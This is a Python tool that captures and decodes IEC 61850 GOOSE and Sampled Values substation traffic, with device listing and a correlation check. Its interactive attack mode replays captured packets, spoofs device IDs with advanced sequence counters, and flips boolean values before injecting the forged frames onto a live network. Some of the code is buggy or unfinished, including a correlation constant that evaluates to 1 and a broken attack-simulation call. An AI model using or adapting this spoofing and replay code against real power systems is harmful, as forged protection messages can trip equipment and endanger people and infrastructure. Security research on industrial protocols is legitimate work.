###############################
# Import Python modules
###############################
import os, sys, inspect, struct

###############################
# Import ASN1 modules
###############################
from pyasn1.codec.ber import decoder, encoder
from pyasn1.type import tag, univ
from pyasn1.type.univ import Boolean, Integer, BitString, SequenceOf
from itertools import combinations

###############################
# Import Scapy and Goose Modules
###############################
# We have to tell script where to find the Goose module in parent directory
currentdir = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
parentdir = os.path.dirname(currentdir)
sys.path.insert(0, parentdir)

from scapy.layers.l2 import Ether
from goose.ralle001_hsr import HSR
from scapy.all import sniff, sendp, Raw, rdpcap
from goose.goose import GOOSE, GOOSEPDU
from goose.goose_pdu import IECGoosePdu
from goose.sv import SV, SVPDU
from goose.sv_asn import SampledValues, ASDU, SavPdu

###############################
# Global Variables
###############################
DEBUG = 0           # 0: off 1: Show Goose Payload 2: Full Debug
SHOW_PACKETS = 0    # 0: off, 1: Shows all the packets
ONLY_SHOW_DIFF = 0  # 0: shows everything, 1: Only shows packets which are different
ATTACK_SIM = 0      # 0: no attack simulation, 1: showcases how an attack should work
ALLOWED_CORRELATION_DELTA = 1 ** (-9)

###############################
# Import packets into SCAPY
###############################
att = False
if len(sys.argv) == 2:
    inf = sys.argv[1]
elif len(sys.argv) == 3:
    inf = sys.argv[1]
    att = sys.argv[2]
else:
    inf = None

###############################
# Identify packets containing GOOSE messages. 
# Sometimes these will be hidden within VLAN packets, so account for these
###############################

GOOSE_TYPE = 0x88b8
SV_TYPE = 0x88ba

def goose_test(pkt):
    # Check for GOOSE Ether Type in Dot1Q, Ether, or HSR layer
    return any(
        pkt.haslayer(layer) and pkt[layer].type == GOOSE_TYPE
        for layer in ['Dot1Q', 'Ether', 'HSR']
    )

def sv_test(pkt):
    # Check for Sampled Values (SV) Ether Type in Ether layer
    return pkt.haslayer('Ether') and pkt['Ether'].type == SV_TYPE


class GooseData:
    def __init__(self, datSet, goID, time, allData, valueList, p, gd):
        self.datSet = datSet
        self.goID = goID
        self.time = time
        self.allData = allData
        self.valueList = valueList
        self.p = p
        self.gd = gd

    def getDatSet(self):
        return self.datSet

    def getID(self):
        return self.goID

    def getAllData(self):
        return str(self.allData)

    def addItemToList(self, newItem):
        self.valueList.append(newItem)

    def getList(self):
        return self.valueList

    def getTime(self):
        return self.time

    def getAttack(self):
        return self.p, self.gd

class SVData:
    def __init__(self, svID, smpCnt, confRev, smpSynch, data, p, asdu):
        self.svID = svID
        self.smpCnt = smpCnt
        self.confRev = confRev
        self.smpSynch = smpSynch
        self.data = data
        self.p = p
        self.asdu = asdu

    def getID(self):
        return self.svID

    def getData(self):
        return self.data

    def printData(self):
        index = 1
        for i in self.data:
            print("Measurement #%s: %s" %(index, i))
            index = index + 1

    def getAttack(self):
        return self.p, self.asdu
    
class CorrelationClass:
    def __init__(self, dev_name, dev_data):
        self.dev_name = dev_name
        self.dev_data = dev_data

    def returnData(self):
        return " ".join(str(i.changed) for i in self.dev_data)

    def filterData(self):
        return [i for i in self.dev_data if i.changed == 1]

class CorrelationElement:
    def __init__(self, changed, timestamp):
        self.changed = changed
        self.timestamp = timestamp
    

###############################
# Process GOOSE PDU by decoding it with PYASN1
###############################
def goose_pdu_decode(encoded_data):

    # Debugging on
    if DEBUG > 2: 
        from pyasn1 import debug
        debug.setLogger(debug.Debug('all'))

    g = IECGoosePdu().subtype(
        implicitTag=tag.Tag(
            tag.tagClassApplication,
            tag.tagFormatConstructed,
            1
        )
    )
    decoded_data, _ = decoder.decode(
        encoded_data,
        asn1Spec=g
    )

    return decoded_data

def sv_pdu_decode(encoded_data):
    # Debugging on
    if DEBUG > 2: 
        from pyasn1 import debug
        debug.setLogger(debug.Debug('all'))

    decoded_data, _ = decoder.decode(
        encoded_data,
        asn1Spec=SampledValues()
    )

    return decoded_data

def floating_point_converter(hex_string):
    format_type = '<f' if len(hex_string) == 8 else '<d' if len(hex_string) == 16 else None
    if not format_type:
        return 0

    bytes_data = bytes.fromhex(hex_string)[::-1]
    return struct.unpack(format_type, bytes_data)[0]

def phsmeas(binary_string):
    decoded_32bit = struct.unpack(f'>{len(binary_string) // 4}i', binary_string)
    return decoded_32bit[::2]


###############################
# Modifying and resending packets
###############################

def goose_pdu_encode(decoded_data):
    """
    Encode the modified GOOSE (or SV) data back into a binary PDU.
    """
    try:
        # Use the pyasn1 encoder to encode the modified data
        encoded_data = encoder.encode(decoded_data)
        return encoded_data
    except Exception as e:
        print(f"Error encoding PDU: {e}")
        if isinstance(decoded_data, dict):
            for name, value in decoded_data.items():
                print(f"Field: {name}, Value: {value}, Type: {type(value)}")
        else:
            print(f"Decoded data is not a dictionary: {type(decoded_data)}")
            print(decoded_data.prettyPrint() if hasattr(decoded_data, 'prettyPrint') else decoded_data)
        return None


def modify_id(data, new_id, id_key, id_num):
    # Generic function to modify IDs in data
    data[id_key] = new_id
    data[id_num] += 10

def toggle_boolean_value(data):
    # Function to toggle boolean values in data['allData']
    index = 1
    for item in data['allData']:
        if hasattr(item, 'getComponentByName'):
            boolean_value = item.getComponentByName('boolean')
            if boolean_value is not None:
                print(f"{index} : {item}")
                index += 1

    while True:
        change_value_id = int(input("Which message do you want to change (-1 to submit): "))
        if change_value_id == -1:
            data['sqNum'] += 10
            break
        toggle_value_by_id(data, change_value_id)


    print("New packet: ")
    for item in data['allData']:
        if hasattr(item, 'getComponentByName'):
            boolean_value = item.getComponentByName('boolean')
            if boolean_value is not None:
                print(item)

def toggle_value_by_id(gd, change_value_id):
    # Helper to toggle a specific boolean by ID
    index = 1
    for item in gd['allData']:
        if hasattr(item, 'getComponentByName'):
            boolean_value = item.getComponentByName('boolean')
            if boolean_value is not None and index == change_value_id:
                item.setComponentByName('boolean', not boolean_value)
            index += 1

def change_bit_string_value(gd):
    index = 1
    for item in gd['allData']:
        if hasattr(item, 'getComponentByName'):
            bit_string_value = item.getComponentByName('bit-string')
            if bit_string_value is not None:
                try:
                    print(f"{index} : {item}")
                    index += 1
                except:
                    ...

    while True:
        change_value_id = int(input("Which message do you want to change (-1 to submit): "))
        if change_value_id == -1:
            break
        new_value = int(input("New value: "))
        change_bit_string_by_id(gd, change_value_id, new_value)

    print("New packet: ")
    for item in gd['allData']:
        if hasattr(item, 'getComponentByName'):
            bit_string_value = item.getComponentByName('bit-string')
            if bit_string_value is not None:
                try:
                    print(item)
                except:
                    ...

def change_bit_string_by_id(gd, change_value_id, new_value):
    index = 1
    for item in gd['allData']:
        if hasattr(item, 'getComponentByName'):
            bit_string_value = item.getComponentByName('bit-string')
            bit_string_value = '11001010'  # Example binary string
            bit_string = univ.BitString(bit_string_value).subtype(
                implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 4)
            )
            if bit_string_value is not None and index == change_value_id:
                try:
                    item.setComponentByName('bit-string', bit_string)
                except Exception as e:
                    print(f"Error while modifying bit-string: {e}")
            index += 1

    # Reassign `allData` to ensure consistency in the schema structure
    gd.setComponentByName('allData', gd['allData'])

def encode_and_update_packet(p, gd):
    # Encode modified GOOSE PDU and update APDU header
    modified_gpdu = goose_pdu_encode(gd)
    if not modified_gpdu:
        return None

    goose_layer = p[Raw]
    apdu_header = goose_layer.load[:8]
    updated_apdu_header = apdu_header[:2] + struct.pack(">H", len(apdu_header) + len(modified_gpdu)) + apdu_header[4:]

    modified_apdu = updated_apdu_header + modified_gpdu

    modified_packet = p.copy()
    modified_packet[Raw].load = modified_apdu

    # Display packets
    print("Original packet:")
    p.show()
    print("\nModified packet:")
    modified_packet.show()

    modified_packets.add((modified_packet[Ether].src, modified_packet[Ether].dst, bytes(modified_packet[Raw].load)))
    return modified_packet

def encode_and_update_sv(p, gd, new_sv_id):
    # Extract the payload from the Raw layer
    original_payload = p[Raw].load

    # Locate the `\x80` tag corresponding to `SAM600MU0101`

    sv_id_string = str(gd['svID'])

    sv_id_start = original_payload.find(b'\x80' + bytes([len(sv_id_string)]) + sv_id_string.encode())
    if sv_id_start == -1:
        print("Error: svID field not found!")
        return None

    # Extract the length of the current svID
    sv_id_end = sv_id_start + 2 + 12  # svID tag + length byte + value length

    print(f"Original svID: {original_payload[sv_id_start + 2:sv_id_end].decode()}")

    # Construct the new svID field
    new_sv_id_encoded = b'\x80' + bytes([len(new_sv_id)]) + new_sv_id.encode()

    # Rebuild the payload: preserve the data before and after the svID
    modified_payload = (
        original_payload[:sv_id_start]  # Bytes before the svID
        + new_sv_id_encoded  # New svID field
        + original_payload[sv_id_end:]  # Bytes after the svID
    )

    # Calculate the original and modified lengths
    original_length = len(original_payload)
    modified_length = len(modified_payload)

    # Add padding to maintain the original length
    if modified_length < original_length:
        padding = original_length - modified_length
        modified_payload += b'\x00' * padding
        print(f"Added {padding} padding bytes to maintain original length.")

    # Recalculate the total payload length
    total_payload_length = len(modified_payload)

    # Update the length field in the APDU header
    updated_apdu_header = (
        modified_payload[:2]  # Preserve bytes before the length field
        + struct.pack(">H", total_payload_length)  # Write the new length in big-endian
        + modified_payload[4:]  # Preserve bytes after the length field
    )

    print("Modified payload with updated length and padding (hex):", updated_apdu_header.hex())

    # Create a copy of the packet and replace the payload
    modified_packet = p.copy()
    modified_packet[Raw].load = updated_apdu_header

    print("Original Payload (hex):", original_payload.hex())
    print("Modified Payload (hex):", modified_packet[Raw].load.hex())


    # Display packets
    print("Original packet:")
    p.show()
    print("\nModified packet:")
    modified_packet.show()

    # Return the modified packet
    return modified_packet

def attack(p, gd, type, replay, rename, change_boolean_value, change_bit_string):
    skip = False
    modified_packet = ""
    if replay:
        sendp(p, iface='en1', verbose=False)
        return
    
    if rename:
        new_name = input("Give me the desired name: ")
        id_key = 'goID' if type == 'GOOSE' else 'svID'
        id_num = 'sqNum' if type == 'GOOSE' else 'smpCnt'
        if type == 'GOOSE': modify_id(gd, new_name, id_key, id_num)
        else: 
            modified_packet = encode_and_update_sv(p, gd, new_name)
            skip = True

    elif change_boolean_value:
        toggle_boolean_value(gd)
    elif change_bit_string:
        change_bit_string_value(gd)         # Still has issues
    if not skip: modified_packet = encode_and_update_packet(p, gd)
    if modified_packet:
        sendp(modified_packet, iface="en1", verbose=False)

def percentage_difference(value1, value2):
    # Ensure we're not dividing by zero (if the values are both zero)
    if value1 == 0 and value2 == 0:
        return 0.0
    
    # Calculate the absolute difference and the average
    difference = abs(value1 - value2)
    average = (value1 + value2) / 2
    
    # Calculate the percentage difference
    return (difference / average) * 100

###############################
# Process packets and search for GOOSE
###############################
devsrc = {}
datSetList = []
gooseData = []
svData = []
modified_packets = set()
dictIDs = {}

def packet_handler(p):
    global modified_packets
    if goose_test(p):
        packet_id = (p['Ether'].src, p['Ether'].dst, bytes(p['Raw'].load))
        if packet_id in modified_packets:
            return

        gd = goose_pdu_decode(GOOSE(p.load)[GOOSEPDU].original)
        src_mac, dst_mac, goid = p['Ether'].src, p['Ether'].dst, gd['goID']

        temp_list = []
        for item in gd['allData']:
            for i in item.values():
                try:
                    temp_list.append(floating_point_converter(i.asOctets().hex()[2:]))
                    if isinstance(i, BitString):
                        temp_list.append(i)
                except:
                    if not isinstance(i, (Boolean, Integer)):
                        for item2 in i:
                            for i2 in item2.values():
                                for i3 in i2:
                                    for i4 in i3.values():
                                        temp_list.append(floating_point_converter(i4.asOctets().hex()[2:]))
                    else:
                        temp_list.append(i)

        gooseData.append(GooseData(str(gd['datSet']), goid, p.time, gd['allData'], temp_list, p, gd))

        devgoose = (dst_mac, str(gd['datSet']), "GOOSE")
        devsrc.setdefault(src_mac, []).append(devgoose) if devgoose not in devsrc.get(src_mac, []) else None

        datSetList.append(str(gd['datSet']))

        if ATTACK_SIM == 1:
            attack(p, gd)

    if sv_test(p):
        src_mac, dst_mac = p['Ether'].src, p['Ether'].dst
        asdu = sv_pdu_decode(bytes.fromhex("60" + SV(p.load)[SVPDU].original.hex()))['savPdu']['asdu'][0]
        decoded_16bit = phsmeas(asdu['sample'].asOctets())

        devgoose = (dst_mac, asdu['svID'], "Sampled Values")
        devsrc.setdefault(src_mac, []).append(devgoose) if devgoose not in devsrc.get(src_mac, []) else None

        datSetList.append(asdu['svID'])
        svData.append(SVData(asdu['svID'], asdu['smpCnt'], asdu['confRev'], asdu['smpSynch'], list(decoded_16bit), p, asdu))



if inf is None:
    sniff(prn=packet_handler, store=0)
else:
    sniff(prn=packet_handler, store=0, iface=inf)

def prompt_for_int(prompt, valid_options=None):
    while True:
        try:
            value = int(input(prompt))
            if valid_options and value not in valid_options:
                print(f"Invalid selection. Choose from {valid_options}.")
            else:
                return value
        except ValueError:
            print("Please enter a valid integer.")

def select_mode():
    print("Replay: 1")
    print("Rename: 2")
    print("Change boolean values: 3")
    print("Change bit.string values: 4 (NOT WORKING)")
    return prompt_for_int("Choose a mode: ", valid_options=[1, 2, 3, 4])

def perform_attack(mode, protocol, p, data):
    options = [mode == 1, mode == 2, mode == 3, mode == 4]
    attack(p, data, protocol, *options)

def handle_attack():
    print('#' * 50)
    print('### Replay Attack')
    print('#' * 50)

    attacked_device_id = prompt_for_int("Enter the device ID: ")
    if attacked_device_id not in dictIDs:
        print("Invalid device ID. Try again.")
        return

    messageType = next(
        (e[2] for devices in devsrc.values() for e in devices if e[1] == dictIDs[attacked_device_id]),
        None
    )

    attacked_message_id = prompt_for_int("Enter the message ID: ")
    mode = select_mode()

    if messageType == "GOOSE":
        handle_attacks("GOOSE", gooseData, attacked_device_id, attacked_message_id, mode)
    elif messageType == "Sampled Values":
        handle_attacks("SV", svData, attacked_device_id, attacked_message_id, mode)
    else:
        print("Unsupported message type.")

def handle_attacks(protocol, data_list, device_id, message_id, mode):
    for index, item in enumerate(data_list, start=1):
        if dictIDs[device_id] == (item.getDatSet() if protocol == "GOOSE" else item.getID()):
            if index == message_id:
                p, data = item.getAttack()
                perform_attack(mode, protocol, p, data)
                break
        elif dictIDs[device_id] == (item.getDatSet() if protocol == "SV" else item.getID()):
            if index == message_id:
                p, data = item.getAttack()
                perform_attack(mode, protocol, p, data)
                break
    else:
        print("Message ID not found.")

# Function to check correlation between two lists of CorrelationElements
def calculate_correlation(list1, list2, allowed_delta):
    count = sum(
        1 for obj1, obj2 in zip(list1, list2)
        if percentage_difference(obj1.timestamp, obj2.timestamp) < allowed_delta
    )
    return count == max(len(list1), len(list2))

###############################
# Print Statements and Functions
###############################

print('#' * 50)
print('### Summary')
print('#' * 50)
print(f'Device Count: {len(devsrc)}\n')

print('Source Address,Destination Address,ID,Protocol')
for src_mac, devices in devsrc.items():
    for dst_mac, dataset, protocol in devices:
        print(f'{src_mac},{dst_mac},{dataset},{protocol}')

print('Select device to analyze.')
uniqueIDs = list(dict.fromkeys(datSetList))
for idx, unique_id in enumerate(uniqueIDs):
    dictIDs[idx] = unique_id
    print(f'[{idx}] {unique_id}')
if att : print('[-2] Attack Mode\n[-3] Find correlation')

while (pnum := input('Select number (-1 to exit): ')) != '-1':
    try:
        pnum = int(pnum)
        
        if pnum == -2:
            handle_attack()

        elif pnum == -3:
            # Main correlation checking
            end_list = []
            for dev_id in dictIDs:
                device_name = dictIDs[dev_id]
                device_correlation = []
                previous_data = None

                for item in (g for g in gooseData if g.getDatSet() == device_name):
                    current_data = item.getAllData()
                    is_changed = int(previous_data != current_data)
                    device_correlation.append(CorrelationElement(is_changed, item.getTime()))
                    previous_data = current_data

                end_list.append(CorrelationClass(device_name, device_correlation))

            # Output correlation data for each device
            for device in end_list:
                print(device.returnData())

            # Compare all pairs of devices for correlation
            for (i, device1), (j, device2) in combinations(enumerate(end_list), 2):
                print(f"\nComparing devices {device1.dev_name} and {device2.dev_name}:")

                list1_filtered = device1.filterData()
                list2_filtered = device2.filterData()
                
                correlation_found = calculate_correlation(list1_filtered, list2_filtered, ALLOWED_CORRELATION_DELTA)
                
                if correlation_found:
                    print(f"Correlation found between {device1.dev_name} and {device2.dev_name}.")
                else:
                    print(f"No correlation between {device1.dev_name} and {device2.dev_name}.")            

        elif pnum not in dictIDs:
            print('Invalid selection. Try again.')
            continue

        
        else:
            messageType = next((e[2] for devices in devsrc.values() for e in devices if e[1] == dictIDs[pnum]), None)

            print('#' * 50)
            print('### Analyze')
            print('#' * 50)
            duplicates = 0
            tempItem = None

            if messageType == "GOOSE":
                print("Message type GOOSE")
                for index, item in enumerate(gooseData, start=1):
                    if dictIDs[pnum] == item.getDatSet():
                        print(f'Message number {index}')
                        if ONLY_SHOW_DIFF == 0 or tempItem != item.getAllData():
                            for value in item.getList():
                                print(f'Value: {value}')
                        if tempItem == item.getAllData():
                            duplicates += 1
                        tempItem = item.getAllData()

            elif messageType == "Sampled Values":
                print("Message type SV")
                for index, item in enumerate(svData, start=1):
                    if dictIDs[pnum] == item.getID():
                        print(f'Message number {index}')
                        item.printData()

            print(f'{duplicates} duplicate packets')

    except ValueError:
        print('Please enter a valid number.')